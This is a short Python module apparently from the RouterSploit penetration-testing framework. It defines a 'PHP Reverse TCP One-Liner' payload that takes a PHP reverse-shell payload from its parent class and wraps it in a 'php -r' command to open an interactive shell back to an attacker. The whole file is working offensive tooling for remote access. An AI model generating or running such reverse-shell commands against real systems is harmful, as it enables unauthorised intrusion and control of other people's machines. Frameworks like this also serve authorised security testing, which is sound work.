from routersploit.core.exploit import *
from routersploit.modules.payloads.php.reverse_tcp import Exploit as PHPReverseTCP


class Exploit(PHPReverseTCP):
    __info__ = {
        "name": "PHP Reverse TCP One-Liner",
        "description": "Creates interactive tcp reverse shell by using php one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    cmd = OptString("php", "PHP binary")

    def generate(self):
        payload = super(Exploit, self).generate()

        cmd = '{} -r "{}"'.format(self.cmd, payload)
        return cmd
